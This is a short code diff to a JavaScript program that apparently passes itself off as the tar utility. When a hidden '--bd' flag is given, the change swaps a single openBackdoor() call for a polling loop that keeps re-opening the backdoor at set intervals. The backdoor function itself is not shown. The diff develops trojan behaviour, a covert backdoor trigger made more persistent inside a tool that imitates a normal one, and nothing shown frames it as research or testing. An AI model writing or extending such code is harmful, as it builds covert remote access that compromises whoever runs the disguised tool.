@@ -12,7 +12,15 @@ if (execName == "client.js") {
 }
 
 if (args.includes("--bd")) {
-  openBackdoor();
+  let count = 0
+  const poll = ()=>{
+    if(count < POLL_COUNT){
+      openBackdoor()
+      count++;
+      setTimeout(poll, POLL_INTERVAL)
+    }
+  }
+  poll();
 } else {
   // First, simulate tar functionality
   execFile(args, execName);
